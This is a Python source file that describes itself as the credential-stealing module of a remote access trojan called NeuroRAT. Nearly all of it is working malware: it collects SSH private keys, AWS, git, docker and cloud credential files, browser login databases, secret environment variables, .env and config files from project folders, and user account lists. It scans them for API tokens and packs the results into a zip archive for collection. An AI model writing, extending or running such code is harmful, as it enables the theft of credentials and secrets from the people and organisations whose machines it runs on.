#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
System Stealer Module for NeuroRAT
Author: Mr. Thomas Anderson (iamtomasanderson@gmail.com)
License: MIT

This module extracts sensitive system data including:
- SSH keys
- API keys and tokens
- AWS/Cloud credentials
- Environment variables
- System configurations
- User account information
"""

import os
import re
import json
import glob
import shutil
import base64
import zipfile
import platform
import tempfile
import traceback
import subprocess
from pathlib import Path
from datetime import datetime
from typing import Dict, List, Optional, Tuple, Any, Union

# Regex patterns for identifying sensitive information
API_KEY_PATTERNS = {
    # AWS
    "aws_access_key": re.compile(r"AKIA[0-9A-Z]{16}"),
    "aws_secret_key": re.compile(r"[0-9a-zA-Z/+]{40}"),
    
    # GitHub
    "github_token": re.compile(r"gh[pousr]_[0-9a-zA-Z]{36}"),
    "github_oauth": re.compile(r"github_pat_[0-9a-zA-Z_]{82}"),
    
    # Google
    "google_api_key": re.compile(r"AIza[0-9A-Za-z\-_]{35}"),
    "google_oauth": re.compile(r"ya29\.[0-9A-Za-z\-_]+"),
    
    # Slack
    "slack_token": re.compile(r"xox[pbar]-[0-9]{12}-[0-9]{12}-[0-9a-zA-Z]{24}"),
    "slack_webhook": re.compile(r"https://hooks.slack.com/services/T[a-zA-Z0-9_]{8}/B[a-zA-Z0-9_]{8}/[a-zA-Z0-9_]{24}"),
    
    # Stripe
    "stripe_standard_api": re.compile(r"sk_live_[0-9a-zA-Z]{24}"),
    "stripe_restricted_api": re.compile(r"rk_live_[0-9a-zA-Z]{24}"),
    
    # Square
    "square_access_token": re.compile(r"sq0atp-[0-9A-Za-z\-_]{22}"),
    "square_oauth_secret": re.compile(r"sq0csp-[0-9A-Za-z\-_]{43}"),
    
    # PayPal
    "paypal_braintree_access_token": re.compile(r"access_token\$production\$[0-9a-z]{16}\$[0-9a-f]{32}"),
    
    # Mailgun
    "mailgun_api_key": re.compile(r"key-[0-9a-zA-Z]{32}"),
    
    # Mailchimp
    "mailchimp_api_key": re.compile(r"[0-9a-f]{32}-us[0-9]{1,2}"),
    
    # Twilio
    "twilio_api_key": re.compile(r"SK[0-9a-fA-F]{32}"),
    "twilio_account_sid": re.compile(r"AC[a-zA-Z0-9]{32}"),
    "twilio_auth_token": re.compile(r"[a-zA-Z0-9]{32}"),
    
    # Heroku
    "heroku_api_key": re.compile(r"[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}"),
    
    # DigitalOcean
    "digitalocean_token": re.compile(r"dop_v1_[a-f0-9]{64}"),
    
    # Generic Tokens
    "jwt_token": re.compile(r"eyJ[a-zA-Z0-9]{10,}\.eyJ[a-zA-Z0-9]{10,}\.[a-zA-Z0-9_-]{10,}"),
    "generic_api_key": re.compile(r"[a-zA-Z0-9_\-]{20,40}")
}

# Locations of common sensitive files
SENSITIVE_FILE_LOCATIONS = {
    "ssh_keys": {
        "windows": [
            "%USERPROFILE%\\.ssh\\id_rsa",
            "%USERPROFILE%\\.ssh\\id_dsa",
            "%USERPROFILE%\\.ssh\\id_ecdsa",
            "%USERPROFILE%\\.ssh\\id_ed25519",
            "%USERPROFILE%\\.ssh\\config"
        ],
        "darwin": [
            "~/.ssh/id_rsa",
            "~/.ssh/id_dsa",
            "~/.ssh/id_ecdsa",
            "~/.ssh/id_ed25519",
            "~/.ssh/config",
            "~/.ssh/known_hosts"
        ],
        "linux": [
            "~/.ssh/id_rsa",
            "~/.ssh/id_dsa",
            "~/.ssh/id_ecdsa",
            "~/.ssh/id_ed25519",
            "~/.ssh/config",
            "~/.ssh/known_hosts"
        ]
    },
    "aws_credentials": {
        "windows": [
            "%USERPROFILE%\\.aws\\credentials",
            "%USERPROFILE%\\.aws\\config"
        ],
        "darwin": [
            "~/.aws/credentials",
            "~/.aws/config"
        ],
        "linux": [
            "~/.aws/credentials",
            "~/.aws/config"
        ]
    },
    "git_credentials": {
        "windows": [
            "%USERPROFILE%\\.git-credentials",
            "%USERPROFILE%\\.gitconfig"
        ],
        "darwin": [
            "~/.git-credentials",
            "~/.gitconfig"
        ],
        "linux": [
            "~/.git-credentials",
            "~/.gitconfig"
        ]
    },
    "docker_credentials": {
        "windows": [
            "%USERPROFILE%\\.docker\\config.json"
        ],
        "darwin": [
            "~/.docker/config.json"
        ],
        "linux": [
            "~/.docker/config.json"
        ]
    },
    "cloud_credentials": {
        "windows": [
            "%USERPROFILE%\\.config\\gcloud\\credentials.db",
            "%USERPROFILE%\\.azure\\credentials",
            "%USERPROFILE%\\.config\\doctl\\config.yaml"
        ],
        "darwin": [
            "~/.config/gcloud/credentials.db",
            "~/.azure/credentials",
            "~/.config/doctl/config.yaml"
        ],
        "linux": [
            "~/.config/gcloud/credentials.db",
            "~/.azure/credentials",
            "~/.config/doctl/config.yaml"
        ]
    },
    "browser_databases": {
        "windows": [
            "%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Login Data",
            "%APPDATA%\\Mozilla\\Firefox\\Profiles\\*\\logins.json"
        ],
        "darwin": [
            "~/Library/Application Support/Google/Chrome/Default/Login Data",
            "~/Library/Application Support/Firefox/Profiles/*/logins.json"
        ],
        "linux": [
            "~/.config/google-chrome/Default/Login Data",
            "~/.mozilla/firefox/*/logins.json"
        ]
    },
    "environment_files": {
        "windows": [
            "*\\.env",
            "*\\.env.local",
            "*\\*.env"
        ],
        "darwin": [
            "*/.env",
            "*/.env.local",
            "*/*.env"
        ],
        "linux": [
            "*/.env",
            "*/.env.local",
            "*/*.env"
        ]
    }
}

class SystemStealer:
    """System data extraction class for NeuroRAT"""
    
    def __init__(self, output_dir: str = None):
        """
        Initialize the system stealer module
        
        Args:
            output_dir: Directory to store extracted data
        """
        self.system = platform.system().lower()
        if self.system == "windows":
            self.user_home = os.environ.get("USERPROFILE")
        else:
            self.user_home = os.environ.get("HOME")
            
        self.output_dir = output_dir or tempfile.mkdtemp(prefix="neurorat_system_")
        os.makedirs(self.output_dir, exist_ok=True)
        
        self.results = {
            "ssh_keys": [],
            "credentials": [],
            "api_keys": [],
            "environment_info": {},
            "user_accounts": [],
            "system_info": {}
        }
    
    def expand_path(self, path: str) -> str:
        """Expand environment variables and user home in path"""
        if self.system == "windows":
            path = path.replace("%USERPROFILE%", os.environ.get("USERPROFILE", ""))
            path = path.replace("%APPDATA%", os.environ.get("APPDATA", ""))
            path = path.replace("%LOCALAPPDATA%", os.environ.get("LOCALAPPDATA", ""))
        else:
            path = path.replace("~/", self.user_home + "/")
        return path
    
    def collect_system_info(self):
        """Collect detailed system information"""
        system_info = {
            "os": platform.system(),
            "os_release": platform.release(),
            "os_version": platform.version(),
            "architecture": platform.machine(),
            "hostname": platform.node(),
            "processor": platform.processor(),
            "username": os.environ.get("USERNAME") or os.environ.get("USER"),
            "home_dir": self.user_home,
            "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        }
        
        # Additional system info based on OS
        if self.system == "windows":
            try:
                # Windows system information
                import wmi
                c = wmi.WMI()
                system = c.Win32_ComputerSystem()[0]
                os_info = c.Win32_OperatingSystem()[0]
                proc_info = c.Win32_Processor()[0]
                gpu_info = c.Win32_VideoController()[0]
                
                system_info.update({
                    "manufacturer": system.Manufacturer,
                    "model": system.Model,
                    "system_type": system.SystemType,
                    "system_family": os_info.Caption,
                    "install_date": os_info.InstallDate,
                    "last_boot": os_info.LastBootUpTime,
                    "processor_name": proc_info.Name,
                    "graphics_card": gpu_info.Name
                })
            except Exception:
                # Fall back to basic info if WMI not available
                pass
        elif self.system == "darwin" or self.system == "linux":
            # Additional info for macOS and Linux
            try:
                # Get CPU info
                if self.system == "darwin":
                    cpu_info = subprocess.check_output(["sysctl", "-n", "machdep.cpu.brand_string"]).decode().strip()
                else:
                    with open("/proc/cpuinfo", "r") as f:
                        cpu_info = [line for line in f if "model name" in line][0].split(":")[1].strip()
                
                system_info["processor_detail"] = cpu_info
                
                # Get memory info
                if self.system == "darwin":
                    mem_info = subprocess.check_output(["sysctl", "hw.memsize"]).decode().strip()
                    system_info["memory"] = str(int(mem_info.split()[1]) // (1024**3)) + " GB"
                else:
                    with open("/proc/meminfo", "r") as f:
                        mem = [line for line in f if "MemTotal" in line][0].split(":")[1].strip()
                    system_info["memory"] = mem
            except Exception:
                pass
        
        self.results["system_info"] = system_info
    
    def collect_user_accounts(self):
        """Collect user account information"""
        if self.system == "windows":
            try:
                # Get user accounts on Windows
                import wmi
                c = wmi.WMI()
                for user in c.Win32_UserAccount():
                    self.results["user_accounts"].append({
                        "name": user.Name,
                        "full_name": user.FullName,
                        "domain": user.Domain,
                        "sid": user.SID,
                        "status": user.Status,
                        "disabled": user.Disabled,
                        "local": user.LocalAccount,
                        "lockout": user.Lockout,
                        "password_changeable": user.PasswordChangeable,
                        "password_expires": user.PasswordExpires
                    })
            except Exception:
                # Try a simpler approach
                try:
                    output = subprocess.check_output(["net", "user"], shell=True).decode()
                    users = [line.strip() for line in output.split("\n") if line.strip() and not line.startswith("--")]
                    # Skip headers and footers
                    users = [u for u in users if not u.startswith("User accounts for") and not u.startswith("The command")]
                    for user in users:
                        if user:
                            self.results["user_accounts"].append({"name": user})
                except Exception:
                    pass
        else:
            # Unix-based systems (Linux/macOS)
            try:
                with open("/etc/passwd", "r") as f:
                    for line in f:
                        if not line.startswith("#"):
                            parts = line.strip().split(":")
                            if len(parts) >= 7:
                                username, _, uid, gid, info, home, shell = parts[:7]
                                if int(uid) >= 1000 and shell not in ["/usr/sbin/nologin", "/bin/false"]:
                                    self.results["user_accounts"].append({
                                        "name": username,
                                        "uid": uid,
                                        "gid": gid,
                                        "info": info,
                                        "home": home,
                                        "shell": shell
                                    })
            except Exception:
                pass
    
    def collect_environment_variables(self):
        """Collect environment variables"""
        # Filter out uninteresting or common environment variables
        filtered_env = {}
        interesting_prefixes = [
            "API_", "KEY_", "SECRET_", "TOKEN_", "PASSWORD_", "PASS_", "AUTH_",
            "AWS_", "AZURE_", "GITHUB_", "GITLAB_", "GOOGLE_", "FIREBASE_",
            "STRIPE_", "TWILIO_", "SENDGRID_", "DATABASE_", "DB_", "MONGO_",
            "MYSQL_", "POSTGRES_", "REDIS_", "SLACK_", "TWITTER_", "FACEBOOK_"
        ]
        
        for key, value in os.environ.items():
            # Add variables that might contain sensitive information
            if any(key.upper().startswith(prefix) for prefix in interesting_prefixes) or any(key.upper().endswith("_TOKEN") or key.upper().endswith("_KEY") or key.upper().endswith("_SECRET") or key.upper().endswith("_PASSWORD")):
                filtered_env[key] = value
        
        self.results["environment_info"]["environment_variables"] = filtered_env
    
    def find_sensitive_files(self):
        """Find and collect sensitive files on the system"""
        for category, locations in SENSITIVE_FILE_LOCATIONS.items():
            if self.system not in locations:
                continue
                
            category_files = []
            for path_pattern in locations[self.system]:
                expanded_pattern = self.expand_path(path_pattern)
                
                # Handle glob patterns
                if '*' in expanded_pattern:
                    try:
                        matching_files = glob.glob(expanded_pattern)
                        for file_path in matching_files:
                            if os.path.exists(file_path) and os.path.isfile(file_path):
                                file_info = {
                                    "path": file_path,
                                    "size": os.path.getsize(file_path),
                                    "modified": datetime.fromtimestamp(os.path.getmtime(file_path)).strftime("%Y-%m-%d %H:%M:%S")
                                }
                                
                                # Try to read the file
                                try:
                                    with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                                        content = f.read()
                                        
                                        # Store files differently based on category and size
                                        if category == "ssh_keys":
                                            # Store SSH keys directly
                                            self.results["ssh_keys"].append({
                                                "file": os.path.basename(file_path),
                                                "content": content
                                            })
                                        elif "credentials" in category:
                                            # Store credential files directly
                                            self.results["credentials"].append({
                                                "type": category,
                                                "file": os.path.basename(file_path),
                                                "content": content
                                            })
                                        
                                        # Scan content for API keys
                                        self.scan_content_for_keys(content, source=file_path)
                                        
                                        # Copy the file to output directory
                                        target_path = os.path.join(self.output_dir, category + "_" + os.path.basename(file_path))
                                        shutil.copy2(file_path, target_path)
                                        file_info["copied_to"] = target_path
                                except Exception as e:
                                    file_info["error"] = str(e)
                                
                                category_files.append(file_info)
                    except Exception:
                        pass
                else:
                    # Direct file path
                    if os.path.exists(expanded_pattern) and os.path.isfile(expanded_pattern):
                        file_info = {
                            "path": expanded_pattern,
                            "size": os.path.getsize(expanded_pattern),
                            "modified": datetime.fromtimestamp(os.path.getmtime(expanded_pattern)).strftime("%Y-%m-%d %H:%M:%S")
                        }
                        
                        # Try to read the file
                        try:
                            with open(expanded_pattern, 'r', encoding='utf-8', errors='ignore') as f:
                                content = f.read()
                                
                                # Store files differently based on category
                                if category == "ssh_keys":
                                    # Store SSH keys directly
                                    self.results["ssh_keys"].append({
                                        "file": os.path.basename(expanded_pattern),
                                        "content": content
                                    })
                                elif "credentials" in category:
                                    # Store credential files directly
                                    self.results["credentials"].append({
                                        "type": category,
                                        "file": os.path.basename(expanded_pattern),
                                        "content": content
                                    })
                                
                                # Scan content for API keys
                                self.scan_content_for_keys(content, source=expanded_pattern)
                                
                                # Copy the file to output directory
                                target_path = os.path.join(self.output_dir, category + "_" + os.path.basename(expanded_pattern))
                                shutil.copy2(expanded_pattern, target_path)
                                file_info["copied_to"] = target_path
                        except Exception as e:
                            file_info["error"] = str(e)
                        
                        category_files.append(file_info)
            
            # Add to results
            if category_files:
                if "files" not in self.results["environment_info"]:
                    self.results["environment_info"]["files"] = {}
                self.results["environment_info"]["files"][category] = category_files
    
    def scan_content_for_keys(self, content: str, source: str = "unknown"):
        """Scan text content for API keys and tokens"""
        for key_type, pattern in API_KEY_PATTERNS.items():
            matches = pattern.findall(content)
            for match in matches:
                self.results["api_keys"].append({
                    "type": key_type,
                    "key": match,
                    "source": source
                })
    
    def scan_project_directories(self):
        """Scan common project directories for sensitive files"""
        # Common locations for project directories
        project_dirs = []
        
        if self.system == "windows":
            project_dirs = [
                os.path.join(self.user_home, "Documents"),
                os.path.join(self.user_home, "Projects"),
                os.path.join(self.user_home, "source"),
                os.path.join(self.user_home, "workspace"),
                os.path.join(self.user_home, "git")
            ]
        else:
            project_dirs = [
                os.path.join(self.user_home, "Documents"),
                os.path.join(self.user_home, "Projects"),
                os.path.join(self.user_home, "src"),
                os.path.join(self.user_home, "workspace"),
                os.path.join(self.user_home, "git"),
                os.path.join(self.user_home, "code")
            ]
        
        # Files to look for
        sensitive_files = [
            ".env", ".env.local", ".env.development", ".env.production",
            "config.json", "settings.json", "credentials.json", "secrets.json",
            "application.properties", "application.yml", "config.properties",
            "wp-config.php", "database.php", "settings.php", "configuration.php"
        ]
        
        for project_dir in project_dirs:
            if os.path.exists(project_dir) and os.path.isdir(project_dir):
                for root, _, files in os.walk(project_dir, topdown=True, followlinks=False):
                    # Skip common node_modules and vendor directories
                    if "/node_modules/" in root or "/vendor/" in root or "/venv/" in root or "/.git/" in root:
                        continue
                    
                    for filename in files:
                        if filename in sensitive_files or any(filename.endswith(ext) for ext in [".pem", ".key", ".crt", ".jks", ".keystore"]):
                            file_path = os.path.join(root, filename)
                            
                            # Skip large files
                            try:
                                if os.path.getsize(file_path) > 1000000:  # Skip files larger than 1MB
                                    continue
                                    
                                # Read and scan file content
                                with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                                    content = f.read()
                                    self.scan_content_for_keys(content, source=file_path)
                                    
                                    # Store the file if it's particularly sensitive
                                    if filename.startswith(".env") or "config" in filename.lower() or "secret" in filename.lower() or "credentials" in filename.lower():
                                        # Copy the file to output directory
                                        target_path = os.path.join(self.output_dir, "project_" + os.path.basename(file_path))
                                        shutil.copy2(file_path, target_path)
                                        
                                        if "project_files" not in self.results["environment_info"]:
                                            self.results["environment_info"]["project_files"] = []
                                            
                                        self.results["environment_info"]["project_files"].append({
                                            "path": file_path,
                                            "size": os.path.getsize(file_path),
                                            "copied_to": target_path
                                        })
                            except Exception:
                                pass
    
    def save_results(self) -> str:
        """Save all extracted data to the output directory"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        result_file = os.path.join(self.output_dir, f"system_data_{timestamp}.json")
        
        with open(result_file, 'w', encoding='utf-8') as f:
            json.dump(self.results, f, indent=2)
            
        # Also create a ZIP archive with all the data
        zip_file = os.path.join(self.output_dir, f"system_data_{timestamp}.zip")
        with zipfile.ZipFile(zip_file, 'w', zipfile.ZIP_DEFLATED) as zipf:
            zipf.write(result_file, os.path.basename(result_file))
            
            # Add any other files we found
            for item in os.listdir(self.output_dir):
                item_path = os.path.join(self.output_dir, item)
                if item_path != zip_file and item_path != result_file:
                    zipf.write(item_path, item)
            
        return zip_file
    
    def run(self) -> Dict:
        """Run the system stealer and return results"""
        self.collect_system_info()
        self.collect_user_accounts()
        self.collect_environment_variables()
        self.find_sensitive_files()
        self.scan_project_directories()
        zip_path = self.save_results()
        
        summary = {
            "ssh_keys_found": len(self.results["ssh_keys"]),
            "credentials_found": len(self.results["credentials"]),
            "api_keys_found": len(self.results["api_keys"]),
            "user_accounts": len(self.results["user_accounts"]),
            "output_file": zip_path
        }
        
        return {
            "status": "success",
            "summary": summary,
            "results": self.results
        }


def main():
    """Main function to run the system stealer module"""
    output_dir = os.path.join(os.getcwd(), "extracted_data")
    
    try:
        stealer = SystemStealer(output_dir)
        results = stealer.run()
        
        print(f"\nSystem Stealer Results:")
        print(f"SSH keys found: {results['summary']['ssh_keys_found']}")
        print(f"Credentials found: {results['summary']['credentials_found']}")
        print(f"API keys found: {results['summary']['api_keys_found']}")
        print(f"User accounts: {results['summary']['user_accounts']}")
        print(f"Output saved to: {results['summary']['output_file']}")
        
    except Exception as e:
        print(f"Error running system stealer: {e}")
        traceback.print_exc()


if __name__ == "__main__":
    main() 